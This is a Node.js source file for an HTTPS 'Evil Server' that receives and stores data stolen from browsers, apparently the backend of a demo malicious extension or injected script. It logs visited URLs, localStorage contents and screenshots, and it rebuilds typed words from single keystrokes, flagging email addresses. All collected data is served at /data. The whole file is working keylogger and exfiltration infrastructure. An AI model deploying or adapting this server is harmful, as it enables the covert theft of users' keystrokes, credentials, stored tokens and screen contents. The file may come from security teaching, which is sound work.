const https = require("https");
const fs = require("fs");
const options = {
  key: fs.readFileSync("example.com+5-key.pem"),
  cert: fs.readFileSync("example.com+5.pem"),
};
console.log("**** Evil Server ****");
console.log("*** MuHAHAHAHAHAHAHAHAA ***");

let content = [];
const getBodyJson = (body) => {
  try {
    return JSON.parse(body);
  } catch (err) {
    return {};
  }
};

let word = "";
https
  .createServer(options, function (request, response) {
    response.setHeader("Access-Control-Allow-Origin", "*");
    response.setHeader("Access-Control-Allow-Methods", "OPTIONS, GET, POST");
    response.setHeader("Access-Control-Max-Age", 2592000); // 30 days
    console.log("Request received: ", request.method, request.url);
    if (request.method === "GET" && request.url === "/data") {
      // Respond with the usage information
      console.log("GET request");
      response.writeHead(200, { "Content-Type": "application/json" });
      response.end(JSON.stringify(content));
    }

    let body = [];
    request
      .on("data", (chunk) => {
        body.push(chunk);
      })
      .on("end", () => {
        const strBody = Buffer.concat(body).toString();

        // console.log(`==== ${request.method} ${request.url}`);
        console.log(strBody);

        const jsonBody = getBodyJson(strBody);
        if (jsonBody.type === "evil-track") {
          content.push({
            date: new Date(),
            type: "url",
            content: jsonBody.url,
          });
        }
        if (jsonBody.type === "report-site") {
          content.push({
            date: new Date(),
            type: "reportedSite",
            content: jsonBody.url,
          });
        }
        if (jsonBody.type === "localstoage") {
          content.push({
            date: new Date(),
            type: "localstorage",
            content: jsonBody.content,
          });
        }
        if (jsonBody.type === "key") {
          const letter = jsonBody.key;
          if (letter !== "Meta" && letter !== "Shift" && letter !== "Control") {
            word += letter;
            if (letter === " " || letter === "Enter" || letter === "Tab") {
              content.push({ date: new Date(), type: "word", content: word });
              if (word.indexOf("@") > -1) {
                console.warn("🎺 email found: " + word + " 🎺");
              }
              word = "";
            }
          }
        }

        if (jsonBody.type === "image") {
          const imageName = `${Date.now()}.html`;
          const htmlWithImage = `<html><body><h1>Hacked Image - ${new Date().toDateString()}</h1><img src="${
            jsonBody.content
          }" /></body></html>`;
          content.push({
            date: new Date(),
            type: "screenshot",
            content: jsonBody.content,
          });
          fs.writeFile(imageName, htmlWithImage, function (err) {
            if (err) throw err;
            console.log("=== Image saved: ", imageName);
          });
        }
        response.end();
      });
  })
  .listen(1111);
